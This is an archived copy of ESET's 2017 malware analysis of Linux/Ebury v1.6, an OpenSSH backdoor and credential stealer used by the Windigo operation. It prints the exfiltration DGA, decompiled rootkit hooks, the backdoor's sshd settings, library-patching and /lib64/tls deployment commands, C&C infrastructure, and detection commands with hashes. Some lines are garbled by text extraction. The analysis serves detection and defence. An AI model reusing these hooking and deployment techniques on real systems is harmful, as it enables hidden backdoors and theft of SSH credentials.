{
    "id": "727d685a-11c9-445a-b258-96de3525631d",
    "created_at": "2023-01-12T15:08:50.899858Z",
    "updated_at": "2025-03-27T02:13:50.561587Z",
    "deleted_at": null,
    "sha1_hash": "c023509aaefbe95da20a118d8456eb30d4af135f",
    "title": "2017-10-30 - Windigo Still not Windigone- An Ebury Update",
    "authors": "",
    "file_creation_date": "2022-05-29T01:08:00Z",
    "file_modification_date": "2022-05-29T01:08:00Z",
    "file_size": 563710,
    "plain_text": "# Windigo Still not Windigone: An Ebury Update\n\n**welivesecurity.com/2017/10/30/windigo-ebury-update-2/**\n\nOctober 30, 2017\n\nIn 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found\na new Ebury sample.\n\n[Frédéric Vachon](https://www.welivesecurity.com/author/fvachon/)\n30 Oct 2017 - 11:58AM\n\nIn 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury In 2017, the team found\na new Ebury sample.\n\n[Back in February 2014, ESET researchers wrote a blog post about an OpenSSH backdoor and credential stealer called Linux/Ebury. Further](https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/)\nresearch showed that this component was the core of an operation involving multiple malware families we called “Operation Windigo”. This\n[led to the publication of a whitepaper covering the full operation.](https://www.welivesecurity.com/wp-content/uploads/2014/03/operation_windigo.pdf)\n\nIn February 2017, we found a new Ebury sample, that introduces a significant number of new features. The version number was bumped to\n1.6.2a. At the time of that discovery, the latest versions we had seen were 1.5.x, months before. After further investigation, we realized that its\ninfrastructure for exfiltrating credentials was still operational and that Ebury was still being actively used by the Windigo gang.\n\nThe original IoCs that we provided back in 2014 are for version 1.4 of Ebury. On their [website, CERT-Bund updated the IoCs for version 1.5.](https://www.cert-bund.de/ebury-faq)\nIn this blog post, we provide technical details about version 1.6, which we discovered in February 2017. We also share updated IoCs for\nversions 1 5 and 1 6\n\n\n-----\n\n## New DGA for exfiltration fallback\n\nEbury v1.4 has a fallback mechanism whereby a domain generation algorithm (DGA) is used when the attacker doesn’t connect to the\ninfected system via the OpenSSH backdoor for three days. Under these conditions, Ebury will exfiltrate the collected data using the generated\ndomain. Ebury v1.6 has the same mechanism, but there is a minor change to the DGA itself. Only the constants changed between these two\nversions, as shown in Figure 2.\n\nPython\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n\ndef DGA(domain_no):\n\n# ords returns the signed integer representation of a one-char string\n\n# (the built-in ord returns only unsigned values)\n\nords = lambda c: struct.unpack(\"b\", c)[0]\n\nTLDS = [ 'info', 'net', 'biz' ]\n\nKEY = \"fmqzdnvcyelwaibsrxtpkhjguo\"\n\nh = \"%x\" % ((domain_no * domain_no + 3807225) & 0xFFFFFFFF)\n\ng = \"\"\n\nfor i in range(len(h))[::-1]:\n\ng += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)]\n\ng += h[i]\n\ng += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)]\n\ng += '.%s' % TLDS[domain_no % len(TLDS)]\n\nreturn g\n\n\n**Figure 1. Ebury v1.6 new DGA implemented in Python**\n\ndiff\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n@@ -4,11 +4,11 @@\n\nords = lambda c: struct.unpack(\"b\", c)[0]\n\nTLDS = [ 'info', 'net', 'biz' ]\n\nKEY = \"fmqzdnvcyelwaibsrxtpkhjguo\"\n\n-  h = \"%x\" % ((domain_no * domain_no + 4091073) & 0xFFFFFFFF)\n\n+  h = \"%x\" % ((domain_no * domain_no + 3807225) & 0xFFFFFFFF)\n\ng = \"\"\n\nfor i in range(len(h))[::-1]:\n\n-    g += KEY[((ords(h[i]) * 4906) + (ords(h[-1]) + i + domain_no)) % len(KEY)]\n\n+    g += KEY[((ords(h[i]) * 3579) + (ords(h[-1]) + i + domain_no)) % len(KEY)]\n\ng += h[i]\n\n-  g += KEY[((ords(h[-1]) * 6816) + (len(h) + domain_no - 1)) % len(KEY)]\n\n+  g += KEY[((ords(h[-1]) * 5612) + (len(h) + domain_no - 1)) % len(KEY)]\n\ng += '.%s' % TLDS[domain_no % len(TLDS)]\n\nreturn g\n\n\n**Figure 2. Differences between DGA in v1.4 and v1.6 implemented in Python**\n\nThe first ten domains generated by the DGA are:\n\nlarfj7g1vaz3y.net\n\n\n-----\n\nd ac3g b\nu2s0k8d1ial3r.info\nh9g0q8a1hat3s.net\nf2y1j8v1saa3t.biz\nxdc1h8n1baw3m.info\nraj2p8z1aae3b.net\no9f3v8r1oaj3p.biz\ntav4h8n1baw3r.info\nhdm5o8e1tas3n.net\n\nEbury sequentially tries the generated domain names until it finds one that has a TXT record set by the operator. To verify the ownership of\nthe domain, Ebury checks whether the TXT record can be decrypted using an RSA public key embedded in its code:\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n1\n\n2\n\n\n-----BEGIN RSA PUBLIC KEY----\nMIGJAoGBAOadSGBGG9x/f1/U6KdwxfGzqSj5Bcy4aZpKv77uN4xYdS5HWmEub5Rj\n\nnAvtKybupWb3AUWwN7UPIO+2R+v6hrF+Gh2apcs9I9G7VEBiToi2B6BiZ3Ly68kj\n\n1ojemjtrG+g//Ckw/osESWweSWY4nJFKa5QJzT39ErUZim2FPDmvAgMBAAE=\n\n-----END RSA PUBLIC KEY----\nlarfj7g1vaz3y.net. 1737 IN A 78.140.134.7\n\nlarfj7g1vaz3y.net. 285  IN TXT\n\"ItTFyJ6tegXn9HkHa+XZX1+fZw0IsfhXl05phu1F7ZXDP4HtKMvrXW8NbUSjY8vkQgDdKsSaSCyrvfkhHodhVQLhIKJJY64HeoInb3m4SCNZN\n\n\n**Figure 3. DNS records for larfj7g1vaz3y[.]net:**\n\nThe A record on the domain is ignored by Ebury.\n\nThe decrypted data has three comma-separated fields. Here’s an example of the data stored in the DNS entry for larfj7g1vaz3y[.]net in\nJanuary 2018:\n\n1 larfj7g1vaz3y.net:3328801113:1517346000\n\nThe first field contains the domain name so the signed data cannot be reused for another domain. The second field is the C&C server IP\naddress and the third field contains a UNIX timestamp used as the expiration date of the signed data. The expiration date is a new field added\nas an anti-sinkhole mechanism and is new to v1.6. If anyone were to try to seize or take ownership of both the domain and the IP address of\nthe exfiltration server, then it would only be possible to reuse the signed data for a limited amount of time, reducing the impact of a successful\nsinkhole attempt — something that did happen for almost all previous versions of the DGA.\n\n**Table 1. Decoded information stored in the TXT record**\n\n**Domain name** **IP Address** **Expiration date**\n\nlarfj7g1vaz3y[.]net 0xc6697959 ⇒ 198[.]105.121.89 2018-01-30 @ 9:00pm (UTC)\n\nWe do not believe Ebury’s operators really expect to use the exfiltration fallback. In the samples we analyzed, multiple bugs were found\npreventing the fallback routine to execute. This code did definitely not go through a complete testing phase. For that reason, we suspect it\nmight be quite rare for Ebury’s operators to lose access to their infected machines. It is also possible they do not mind losing access to a few\nmachines once in a while, since they control so many compromised systems. Why such efforts are put into a mechanism that is not working\nanymore remains unclear to us.\n\n**Changes summary**\n\nSlightly modified DGA (constants changed)\nAdded an expiration date for exfiltration server DNS entry validity\nNew registered domain: larfj7g1vaz3y[.]net\nNew exfiltration server IP address: 198[.]105.121.89\n\n**New features**\n\nNew functionalities were added in version 1.6. For unknown reasons, these new features were not available on all of the v1.6 samples we\nanalyzed.\n\n\n-----\n\nbu y o p e e ts se d g tec [ques usua y desc bed as a use a d oot t](https://en.wikipedia.org/wiki/Rootkit#User_mode) o do so, t oo s t e eadd o eadd 6 u ct o,\neach of which is used to list directory entries. If the next directory structure to return is the Ebury shared library file, the hook skips it and\nreturns the subsequent entry instead.\n\nC\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n\nstruct dirent *__fastcall readdir(__int64 a1)\n\n{\n\nstruct dirent *dir_entry; // rax\n\nstruct dirent *dir_entry_1; // rbx\n\n__ino_t inode; // rax\n\ndo\n\n{\n\nif ( !readdir_0 )\n\nreaddir_0 = F_resolve_func(\"readdir\");\n\ndir_entry = readdir_0(a1);\n\ndir_entry_1 = dir_entry;\n\nif ( !exports_hook_activated )\n\nbreak;\n\nif ( !dir_entry )\n\nbreak;\n\nif ( !ebury_inode )\n\nbreak;\n\ninode = dir_entry->d_ino;\n\nif ( inode != ebury_inode && inode != ebury_lstat_inode )\n\nbreak;\n\n}\n\nwhile ( ebury_filename && !strncmp(dir_entry_1->d_name, ebury_filename,\n\nebury_filename_len_before_extension) );\n\nreturn dir_entry_1;\n\n}\n\n\n**Figure 4. Hex-Rays output of Ebury’s readdir hook**\n\nActivation of these hooks is done by Ebury injecting its dynamic library into every descendant processes of sshd. To inject itself into\nsubprocesses, Ebury hooks execve and use the dynamic linker LD_PRELOAD variable. Every time a new process is created, Ebury adds\nLD_PRELOAD=<Ebury_filename> to its environment. Once the new process is executed, Ebury’s dynamic library is loaded and its\nconstructor is called, executing the hooking routines.\n\n[As mentioned in an article on srvfail.com, there’s a thread on StackExchange of a user stating that his machine was compromised by Ebury.](https://srvfail.com/check-clean-ebury-ssh-rootkit/)\nThe behavior he describes corresponds to the self-hiding techniques we’ve witnessed in Ebury v1.6.2a.\n\nEarlier versions of Ebury used to work only on very specific versions of OpenSSH and were Linux-distribution-specific. Typically, previous\nEbury samples would work for three to five OpenSSH builds for a given Linux distribution. This is no longer the case. Most of the OpenSSH\npatching routines were replaced by function hooking. There are no hardcoded offsets anymore. We tried installing Ebury on machines running\nDebian Jessie, CentOS 7 and Ubuntu Artful with the same sample and it worked in all cases.\n\nTo inject the OpenSSH server configuration directly into memory, Ebury parses the sshd binary’s code section mapped in the same process\nlooking for two different functions. It tries to find the address of parse_server_config or process_server_config_line. If it fails, it downgrades\nsecurity features by disabling SELinux Role-Based Access Control and deactivating PAM modules When one of the functions is successfully\n\n\n-----\n\neso ed, bu y use t s e t e bac doo s used to ta pe t ss d s co gu at o\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n\nPrintLastLog no\n\nPrintMotd no\n\nPasswordAuthentication no\n\nPermitRootLogin yes\n\nUseLogin no\n\nUsePAM no\n\nUseDNS no\n\nChallengeResponseAuthentication no\n\nLogLevel QUIET\n\nStrictModes no\n\nPubkeyAuthentication yes\n\nAllowUsers n\n\nAllowGroups n\n\nDenyUsers n\n\nDenyGroups n\n\nAuthorizedKeysFile /proc/self/environ\n\nBanner /dev/null\n\nPermitTunnel yes\n\nAllowTcpForwarding yes\n\nPermitOpen any\n\n\n**Figure 5. Configuration used by Ebury’s backdoor**\n\nEbury’s authors also hardened their backdoor mechanism. Instead of relying only on a password encoded in the SSH client version string,\nactivating the backdoor now requires a private key to authenticate. It is possible this extra check was added to prevent others who may have\nfound the backdoor password from using it to gain access to the Ebury-compromised server.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESH\n\nCvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2ygjzXd3BD+ADXDurAlDG\n\nbh0NsyCJDFCQ8Bsrwl7p5ZEPEfBOh99IBMbAOgqVmM9tTv7ci05yoBEEcFsNaBg00\n\nH+m0GooLsNsl+5TG3a2aUg6Dg2CKfi55HHTHC/9rqoAdv7Gbc5Y7W8xrNIjOIuxDx\n\nBx353bKO0uSuL06m2Q4m8kYlaw51ZWVylIhGOPm4ldqP4Jjls8QtL/Eg2ZD7epUq6\n\n3E/xqI4tMEQl9BmW1Df5+LjbVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub\n\n\n**Figure 6. Ebury’s operators RSA public key**\n\nWhen there’s a backdoor connection attempt, Ebury modifies the AuthorizedKeysFile option to point to /proc/self/environ. It hooks open or\nopen64 and checks whether there’s an attempt to open /proc/self/environ or a path containing .ssh/authorized_keys. The second check might\nbe used as a fallback in case Ebury failed to resolve parse_server_config and process_server_config_line to push its own configuration.\nEbury also hooks fgets which is called by sshd to read the content of the authorized_keys file. A global variable is used to make sure fgets is\ncalled after the authorized_keys file was opened. Then, the hook fills the fgets buffer with the Ebury operators’ public key so the attackers’\nkey is used for authentication.\n\nC\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n\nchar __fastcall fgets_hook(char s, __int64 size, FILE stream)\n\n{\n\nint fd_env; // ebp\n\nchar *result; // rax\n\nif ( !(backdoor_command & 1) )\n\nreturn fgets_0(s);\n\nfd_env = fd_proc_self_environ;\n\nif ( fd_proc_self_environ <= 0 || fd_env != fileno(stream) )\n\nreturn fgets_0(s);\n\nstrcpy(\n\ns,\n\n\"ssh-rsa\nAAAAB3NzaC1yc2EAAAADAQABAAABAQDr3cAedzlH3aq3nrIaaQdWpqESHCvfGi4nySL1ikMJowgonAf5qFtH4JKMn7HhW5hWBAyYj2yg\n\n\"bVRoEFBWEbMDfHZm7XNG5R3UiwX4H2Ub\\n\");\n\nresult = s;\n\nfd_proc_self_environ = 0;\n\nreturn result;\n\n}\n\n\n**Figure 7. Hex-Rays output of the fgets hook**\n\nSomething that remains a mystery to us is the purpose of this memcpy hook:\n\nC\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n\nchar *__fastcall memcpy_hook(char *dst, const char *src, size_t len)\n\n{\n\nsize_t len_1; // r12\n\nchar *result; // rax\n\nlen_1 = len;\n\nmemcpy_orig(dst, src, len);\n\nif ( len_1 > 0x1F && !strncmp(src, \"chacha20-poly1305@openssh.com,\", 0x1EuLL) )\n\nresult = memcpy_orig(dst, src + 30, len_1 - 30);\n\nelse\n\nresult = dst;\n\nreturn result;\n\n}\n\n\n**Figure 8. Hex-Rays output of the memcpy hook**\n\nWhile we know the hook is used to remove the chacha20-poly1305 algorithm during the SSH key exchange, we are puzzled as to why\nEbury’s authors do not want this algorithm to be used.\n\n## New installation methods\n\n\n-----\n\ne ous y, bu y added ts pay oad s de t e b eyut s so b a y e e ou d co ta bot t e eg t ate b eyut s u ct o s a d t e\nEbury malicious code, launched when loaded. When compromised, the file was larger than usual, a sign of compromise we shared back in\n2014.\n\nWhile we’ve seen this technique used by version 1.6, Ebury authors have come up with new tricks to fool our IoCs. They still use the\nlibkeyutils.so file, but differently.\n\nFrom what we have witnessed, the deployment scripts and techniques seem to differ based on the Linux distribution of the targeted system.\n\n## Debian/Ubuntu\n\nOn Debian/Ubuntu systems, Ebury is currently deployed using a new method. Since libkeyutils.so is loaded by the OpenSSH client and the\nOpenSSH server executables, it remains an interesting target for the attackers. We’ve previously seen Ebury installed by changing the\nlibkeyutils.so.1 symbolic link to point to the malicious version of the library. The altered library would have a constructor where Ebury’s\ninitialization code is stored. Every time libkeyutils.so is loaded, the constructor is called. Thus, every time the OpenSSH client or server is\nlaunched, Ebury is injected into the process.\n\nThe latest deployment method on Debian/Ubuntu now relies on patching libkeyutils.so to force it to load Ebury, which is stored in a separate\n.so file. Comparing an original and a patched version, we notice that there’s an additional entry in the .dynamic section of the ELF header.\nThis entry is of type NEEDED (0x01), meaning that it is a dependency of this executable and that it will be loaded at runtime. In the\ndeployment script we’ve analyzed, the library to be loaded is named libsbr.so and contains Ebury’s malicious code.\n\ndiff\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\n--- ./libkeyutils.so.1-5      2017-10-13 21:19:24.269521814 -0400\n\n+++ ./libkeyutils.so.1-5.patched  2017-10-13 21:19:17.405092274 -0400\n\n@@ -1,5 +1,5 @@\n\n-Dynamic section at offset 0x2cf8 contains 26 entries:\n\n+Dynamic section at offset 0x2cf8 contains 27 entries:\n\nTag    Type             Name/Value\n\n0x0000000000000001 (NEEDED)       Shared library: [libc.so.6]\n\n0x000000000000000e (SONAME)       Library soname: [libkeyutils.so.1]\n\n@@ -26,4 +26,5 @@\n\n0x000000006fffffff (VERNEEDNUM)     1\n\n0x000000006ffffff0 (VERSYM)       0xdf0\n\n0x000000006ffffff9 (RELACOUNT)     3\n\n+ 0x0000000000000001 (NEEDED)       Shared library: [libsbr.so]\n\n0x0000000000000000 (NULL)        0x0\n\n\n**Figure 9. Dynamic section diff between an original and a patched libkeyutils.so**\n\nThe patching process has two steps. First, the string “libsbr.so” must be stored in the strings table of the binary. Second, a new entry of type\n0x1 (DT_NEEDED) must be added to the dynamic section of the ELF headers. This entry must point to the library string with an offset in the\nstring table. Ebury’s authors replace the “__bss_start” string by “_\\x00libsbr.so“. Since __bss_start is not used by the dynamic linker,\nmodifying this symbol has no impact on the execution of the library. Figure 10 shows the difference between the original and the altered\nstrings table of libkeyutils.so.\n\n\n-----\n\n**Figure 10. Differences between an original and a patched string table**\n\nNow that the “libsbr.so” string is stored in the strings table, a new entry must be added in the .dynamic section. Figure 11 shows the difference\nbetween the .dynamic section of the original and the patched libkeyutils.so.\n\n\n-----\n\n**Figure 11. Differences between an original and a patched .dynamic section**\n\nThe .dynamic section contains an array of Elf64_Dyn for amd64 binaries and Elf64_Dyn for i386 binaries. The definitions of these structures\nare displayed in Figure 12.\n\nC\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n\ntypedef struct {\n\nElf32_Sword  d_tag;\n\nunion {\n\nElf32_Word d_val;\n\nElf32_Addr d_ptr;\n\n} d_un;\n\n} Elf32_Dyn;\n\ntypedef struct {\n\nElf64_Sxword  d_tag;\n\nunion {\n\nElf64_Xword d_val;\n\nElf64_Addr d_ptr;\n\n} d_un;\n\n} Elf64_Dyn;\n\n\n**Figure 12. Structures related to the .dynamic section**\n\nIn Figure 13, we have a 64-bit versions of libkeyutils.so. Thus, the new entry in the .dynamic section could be written as follows:\n\nC\n\n\n1\n\n2\n\n3\n\n\nElf64_Dyn dyn;\n\ndyn.d_tag = DT_NEEDED;\n\ndyn.d_val = 0x38F;\n\n\n**Figure 13. New .dynamic entry**\n\nThe first field is 0x1, which translates to the DT_NEEDED tag. The second field is the offset to the “libsbr.so” string in the strings table: 0x3F8.\n\nFor better stealth, Ebury’s operators take care to patch the MD5 sums of the libkeyutils1 package. So, it is not possible to check if a system is\ninfected by looking at the package integrity. Such a command wouldn’t show any errors:\n\nShell\n\n1 $ dpkg --verify libkeyutils1\n\nMultiple filenames are used by Ebury when it is deployed as a standalone library. Here’s the list of the filenames we’re aware of:\n\nlibns2.so\nlibns5.so\nlibpw3.so\nlibpw5.so\nlibsbr.so\nlibslr.so\n\n## CentOS\n\nSimilar techniques to the one described for Debian/Ubuntu deployment are used on CentOS. Attackers would patch libkeyutils.so to force it to\nload an additional library. In addition, we’ve noticed a new technique used for deploying Ebury on CentOS/RedHat systems. We don’t know all\nthe details about how the installation process works yet. Looking at various online reports helped us make some educated guesses as to how\nthe deployment happens.\n\n\n-----\n\ne e a a e o bu y be g dep oyed as a sepa ate s a ed object oaded by b eyut s a ay s a to eb a s dep oy e t ut e a so\nwitnessed another installation method, which we believe is the deployment method for v1.6. As was the case in previous releases of Ebury,\nthe operators build their own version of libkeyutils.so to which they add a constructor containing the malicious code. Instead of altering the\nlibkeyutils.so.1 from /lib/ or /lib64/ they use the /lib{,64}/tls/ folder to drop their file because the dynamic linker looks at this directory first when\nresolving dependencies.\n\nWe believe the deployment process for this version is to drop Ebury in /lib/tls/ or /lib64/tls/ depending on the architecture of the victim’s\nsystem. Then, running ldconfig will automatically create a symbolic link /lib{,64}/tls/libkeyutils.so.1 pointing to the malicious shared object.\n\nShell\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n\n# ldd /usr/bin/ssh | grep -i libkeyutils\n\nlibkeyutils.so.1 => /lib64/libkeyutils.so.1 (0x00007ff67774f000)\n\n# cp libkeyutils.so.1.5 /lib64/tls/\n\n# ldd /usr/bin/ssh | grep -i libkeyutils\n\nlibkeyutils.so.1 => /lib64/libkeyutils.so.1 (0x00007f44ac6ba000)\n\n# ldconfig\n\n# ldd /usr/bin/ssh | grep -i libkeyutils\n\nlibkeyutils.so.1 => /lib64/tls/libkeyutils.so.1 (0x00007fc12db23000)\n\n# ls -al /lib64/tls\n\ntotal 24\n\ndr-xr-xr-x 1 root root 4096 Oct 18 14:34 .\n\ndr-xr-xr-x 1 root root 4096 Oct 18 13:25 ..\n\nlrwxrwxrwx 1 root root  18 Oct 18 14:34 libkeyutils.so.1 -> libkeyutils.so.1.5\n\n-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5\n\n\n**Figure 14. Usage of ldconfig to deploy Ebury in /lib64/tls/**\n\nAdditionally, it makes for a simple uninstallation system that doesn’t require fiddling with symbolic links and keeping some backup copies of\nthe original libkeyutils shared object in case something goes wrong during the deployment process. The only thing that is needed is to erase\nthe malicious libkeyutils.so file in the /lib{,64}/tls/ folder, then run ldconfig again and the system is back to its original state.\n\nShell\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n\n# ls -l /lib64/tls\n\ntotal 16\n\nlrwxrwxrwx 1 root root  18 Oct 18 14:34 libkeyutils.so.1 -> libkeyutils.so.1.5\n\n-rwxr-xr-x 1 root root 15688 Oct 18 14:34 libkeyutils.so.1.5\n\n# rm /lib64/tls/libkeyutils.so.1.5\n\n# ldconfig\n\n# ls -l /lib64/tls\n\ntotal 0\n\n# ldd /usr/bin/ssh | grep -i libkeyutils\n\nlibkeyutils.so.1 => /lib64/libkeyutils.so.1 (0x00007f7b89349000)\n\n# ls -l /lib64/libkeyutils.so.1\n\nlrwxrwxrwx 1 root root 18 Oct 18 13:25 /lib64/libkeyutils.so.1 -> libkeyutils.so.1.5\n\n\n**Figure 15. Usage of ldconfig to uninstall Ebury**\n\n\n-----\n\ne t s subd ecto y s used toget e t a eatu e o t e u oade e e t e C U suppo ts so e add t o a st uct o set, t e o e\nthat directory takes precedence over the “regular” one. The tls directory is actually for a [pseudo-hwcap for “TLS support” that is always](https://sourceware.org/git/?p=glibc.git;a=blob;f=elf/ldconfig.c;h=99caf9e9bb9ff20eac07fc45b28c16d1958aec38;hb=HEAD#l1296)\npresent nowadays.\n\n## Conclusion\n\nEven after the [arrest of Maxim Senakh, the core of Windigo is still operational. Ebury, the main component of the Linux botnet, has gone](https://www.welivesecurity.com/2017/10/30/esets-research-fbi-windigo-maxim-senakh/)\nthrough significant upgrades. It now uses self-hiding techniques and new ways to inject into OpenSSH related processes. Furthermore, it\nuses a new domain generation algorithm (DGA) to find which domain TXT record to fetch. The exfiltration server IP address is concealed in\nthese data, signed with the attackers’ private key. An expiration date was added to the signed data to defend against signature reuse, thus\nmitigating potential sinkhole attempts. Windigo’s operators regularly monitor publicly shared IoCs and quickly adapt to fool available\nindicators. Keep this is mind when trying to determine if a system is infected using public IoCs. The older they are, the more likely they are to\nbe obsolete.\n\n### Indicators of Compromise (IoCs)\n\nIn this section, we share our IoCs that may help identify the latest variants of Ebury. We provide these to help the community detect if their\nsystems are compromised but they are in no way to be considered perfect.\n\nEbury now uses an abstract UNIX socket to communicate with an external process that will be responsible for data exfiltration. In most cases,\nthe socket name begins with “/tmp/dbus-“. The real dbus can create a socket using the same pattern. However, Ebury does this with\nprocesses not related to the legitimate dbus. If the following command outputs the socket, it is suspicious:\n\nShell\n\n1 $ lsof -U | grep -F @/tmp/dbus- | grep -v ^dbus\n\nHere’s a list of the processes we know Ebury uses as an exfiltration agent:\n\nauditd\ncrond\nanacron\narpd\nacpid\nrsyslogd\nudevd\nsystemd-udevd\natd\nhostname\nsync\n\nOn CentOS/Redhat, having a libkeyutils.so* file in /lib/tls/ or /lib64/tls/ is suspicious.\n\nRunning objdump -x libkeyutils.so.1 (or readelf -d libkeyutils.so.1) will print the dynamic section of the ELF header. Anything NEEDED (type 1)\nother than libc or libdl is suspicious.\n\nShell\n\n1 $ objdump -x /path/to/libkeyutils.so.1 | grep NEEDED | grep -v -F -e libdl.so -e libc.so\n\nIn the event that your machine is infected with an Ebury version with the userland rootkit, there are many ways to detect that this is the case.\nSince Ebury injects itself using the dynamic linker LD_PRELOAD environment variable, we can use some other environment variable to trace\nthe dynamic linking process. If libkeyutils is loaded in some process where it shouldn’t be, it is very likely that the system is infected with a\nrootkit-enabled version of Ebury. If the following command raises result, it is very suspicious:\n\nShell\n\n1 $ LD_DEBUG=symbols /bin/true 2>&1 | grep libkeyutils\n\nIf you detect compromised machines, we strongly suggest doing a full system reinstallation because Windigo sometimes installs additional\nmalware. Therefore, a machine compromised by Ebury is likely to be polluted by other threats. Additionally, consider all user credentials and\n_all SSH keys to be compromised. Make sure to change them all._\n\n\n-----\n\n### Table 2. Ebury-related hashes\n\n**SHA-1** **Filename** **Version** **Detection Name**\n\n5c796dc566647dd0db74d5934e768f4dfafec0e5 **libns2.so** **1.5.0** **Linux/Ebury.B**\n\n615c6b022b0fac1ff55c25b0b16eb734aed02734 **Unknown** **1.5.1** **Linux/Ebury.E**\n\nd4eeada3d10e76a5755c6913267135a925e195c6 **libns5.so** **1.5.1c** **Linux/Ebury.E**\n\n27ed035556abeeb98bc305930403a977b3cc2909 **libpw3.so** **1.5.1d** **Linux/Ebury.E**\n\n2f382e31f9ef3d418d31653ee124c0831b6c2273 **libpw5.so** **1.5.1e** **Linux/Ebury.E**\n\n7248e6eada8c70e7a468c0b6df2b50cf8c562bc9 **libpw5.so** **1.5.1f** **Linux/Ebury.I**\n\ne8d3c369a231552081b14076cf3eaa8901e6a1cd **libkeyutils lib** **1.5.5** **Linux/Ebury.F**\n\n1d3aafce8cd33cf51b70558f33ec93c431a982ef **libkeyutils lib** **1.5.5** **Linux/Ebury.F**\n\na559ee8c2662ee8f3c73428eaf07d4359958cae1 **libkeyutils lib** **1.5.5c** **Linux/Ebury.F**\n\n17c40a5858a960afd19cc02e07d3a5e47b2ab97a **libslr.so** **1.5.6dp** **Linux/Ebury.I**\n\neb352686d1050b4ab289fe8f5b78f39e9c85fb55 **libkeyutils.so.1.5** **1.5.6d** **Linux/Ebury.F**\n\n44b340e90edba5b9f8cf7c2c01cb4d45dd25189e **libkeyutils.so.1.5** **1.6.2a** **Linux/Ebury.I**\n\ne8d392ae654f62c6d44c00da517f6f4f33fe7fed **libsbr.so** **1.6.2gp** **Linux/Ebury.I**\n\nb58725399531d38ca11d8651213b4483130c98e2 **libsbr.so** **1.6.2gp** **Linux/Ebury.I**\n\n30 Oct 2017 - 11:58AM\n\n### Sign up to receive an email update whenever a new article is published in our Ukraine Crisis – Digital Security Resource Center\n\n Newsletter\n\n Discussion\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-10-30 - Windigo Still not Windigone- An Ebury Update.pdf"
    ],
    "report_names": [
        "2017-10-30 - Windigo Still not Windigone- An Ebury Update.pdf"
    ],
    "threat_actors": [
        {
            "id": "3844202f-b24a-4e16-b7b9-dfe8c0a44d5d",
            "created_at": "2022-10-25T16:07:24.526179Z",
            "updated_at": "2025-03-27T02:02:10.27234Z",
            "deleted_at": null,
            "main_name": "Operation Windigo",
            "aliases": [],
            "source_name": "ETDA:Operation Windigo",
            "tools": [
                "CDorked",
                "CDorked.A",
                "Calfbot",
                "Ebury"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "1934b371-2525-4615-a90a-772182bc4184",
            "created_at": "2022-10-25T15:50:23.396576Z",
            "updated_at": "2025-03-27T02:00:55.460522Z",
            "deleted_at": null,
            "main_name": "Windigo",
            "aliases": [
                "Windigo"
            ],
            "source_name": "MITRE:Windigo",
            "tools": [
                "Ebury"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1673536130,
    "ts_updated_at": 1743041630,
    "ts_creation_date": 1653786480,
    "ts_modification_date": 1653786480,
    "files": {
        "pdf": "https://archive.orkl.eu/c023509aaefbe95da20a118d8456eb30d4af135f.pdf",
        "text": "https://archive.orkl.eu/c023509aaefbe95da20a118d8456eb30d4af135f.txt",
        "img": "https://archive.orkl.eu/c023509aaefbe95da20a118d8456eb30d4af135f.jpg"
    }
}